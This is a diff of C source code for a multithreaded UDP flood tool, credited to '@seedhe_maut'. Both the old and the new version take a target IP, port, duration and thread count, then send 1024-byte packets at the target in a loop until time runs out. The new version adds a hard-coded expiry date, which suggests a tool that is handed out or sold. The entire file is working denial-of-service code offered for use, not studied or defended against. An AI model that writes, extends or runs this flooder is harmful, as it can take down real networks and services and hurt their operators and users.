@@ -1,90 +1,111 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <unistd.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
 #include <arpa/inet.h>
 #include <pthread.h>
-#include <signal.h>
+#include <unistd.h>
 #include <time.h>
 
-#define PACKET_SIZE 1024  // Adjustable size of UDP packets
+#define EXPIRY_YEAR 2025
+#define EXPIRY_MONTH 3
+#define EXPIRY_DAY 20
 
-volatile int running = 1;
+// Attack parameters (configurable via CLI)
+char target_ip[20];
+int target_port, attack_time, num_threads;
 
-// Graceful exit on CTRL+C
-void handle_signal(int signal) {
-    running = 0;
+// Function to check expiry date
+void check_expiry() {
+    time_t now = time(NULL);
+    struct tm expiry_date = {.tm_year = EXPIRY_YEAR - 1900, .tm_mon = EXPIRY_MONTH - 1, .tm_mday = EXPIRY_DAY};
+
+    if (difftime(now, mktime(&expiry_date)) > 0) {
+        printf("[-] This script has expired. Contact @seedhe_maut for updates.\n");
+        exit(EXIT_FAILURE);
+    }
 }
 
-// UDP Flood attack function
+// Function for handling errors
+void handle_error(const char *message) {
+    perror(message);
+    exit(EXIT_FAILURE);
+}
+
+// Function executed by each attack thread
 void *udp_flood(void *arg) {
-    char **params = (char **)arg;
-    char *target_ip = params[0];
-    int target_port = atoi(params[1]);
-    int duration = atoi(params[2]);
-
-    struct sockaddr_in target;
+    struct sockaddr_in victim;
     int sock;
-    char packet[PACKET_SIZE];
+    char packet[1024];
 
-    memset(&target, 0, sizeof(target));
-    target.sin_family = AF_INET;
-    target.sin_port = htons(target_port);
-    inet_pton(AF_INET, target_ip, &target.sin_addr);
+    // Set target details
+    memset(&victim, 0, sizeof(victim));
+    victim.sin_family = AF_INET;
+    victim.sin_port = htons(target_port);
+    victim.sin_addr.s_addr = inet_addr(target_ip);
 
-    memset(packet, 'X', PACKET_SIZE); // Fill packet with arbitrary data
+    // Packet payload
+    memset(packet, 'A', sizeof(packet));
+
+    // Create a UDP socket with socket reuse
+    sock = socket(AF_INET, SOCK_DGRAM, 0);
+    if (sock < 0) handle_error("Socket creation failed");
+
+    int optval = 1;
+    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
+
+    printf("[+] Thread %ld attacking %s:%d\n", pthread_self(), target_ip, target_port);
 
     time_t start_time = time(NULL);
-    while (running && (time(NULL) - start_time < duration)) {
-        if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
-            perror("Socket error");
-            continue;
-        }
-
-        sendto(sock, packet, PACKET_SIZE, 0, (struct sockaddr *)&target, sizeof(target));
-        close(sock);  // Close socket after sending to prevent exhaustion
-    }
-
-    return NULL;
-}
-
-// Function to start multiple attack threads
-void start_attack(char *target_ip, int target_port, int duration, int threads) {
-    pthread_t thread_pool[threads];
-    char *params[] = {target_ip, (char *)&target_port, (char *)&duration};
-
-    for (int i = 0; i < threads; i++) {
-        if (pthread_create(&thread_pool[i], NULL, udp_flood, (void *)params) != 0) {
-            perror("Thread creation failed");
+    while (time(NULL) - start_time < attack_time) {
+        if (sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&victim, sizeof(victim)) < 0) {
+            perror("Send failed");
         }
     }
 
-    for (int i = 0; i < threads; i++) {
-        pthread_join(thread_pool[i], NULL);
+    close(sock);
+    pthread_exit(NULL);
+}
+
+// Function to start attack threads
+void start_attack() {
+    pthread_t threads[num_threads];
+
+    for (int i = 0; i < num_threads; i++) {
+        if (pthread_create(&threads[i], NULL, udp_flood, NULL) != 0) {
+            handle_error("Thread creation failed");
+        }
+    }
+
+    for (int i = 0; i < num_threads; i++) {
+        pthread_join(threads[i], NULL);
     }
 }
 
+// Main function
 int main(int argc, char *argv[]) {
+    printf("Made and Owned by @seedhe_maut\n");
+
+    // Check expiry before executing
+    check_expiry();
+
     if (argc != 5) {
-        printf("Usage: %s <IP> <Port> <Duration> <Threads>\n", argv[0]);
-        printf("Made by @seedhe_maut\n");
-        return 1;
+        printf("Usage: %s <IP> <Port> <Time (seconds)> <Threads>\n", argv[0]);
+        return EXIT_FAILURE;
     }
 
-    signal(SIGINT, handle_signal);
+    // Get parameters from command line
+    strncpy(target_ip, argv[1], sizeof(target_ip) - 1);
+    target_port = atoi(argv[2]);
+    attack_time = atoi(argv[3]);
+    num_threads = atoi(argv[4]);
 
-    char *target_ip = argv[1];
-    int target_port = atoi(argv[2]);
-    int duration = atoi(argv[3]);
-    int threads = atoi(argv[4]);
+    printf("[*] Starting UDP flood attack on %s:%d for %d seconds using %d threads...\n",
+           target_ip, target_port, attack_time, num_threads);
 
-    printf("\n🔥 UDP Flood Attack 🔥\n");
-    printf("Target: %s:%d\n", target_ip, target_port);
-    printf("Duration: %d seconds | Threads: %d\n", duration, threads);
-    printf("Made by @seedhe_maut\n\n");
-    
-    start_attack(target_ip, target_port, duration, threads);
+    start_attack();
 
-    printf("Attack completed.\n");
-    return 0;
+    printf("[*] Attack completed.\n");
+    return EXIT_SUCCESS;
 }
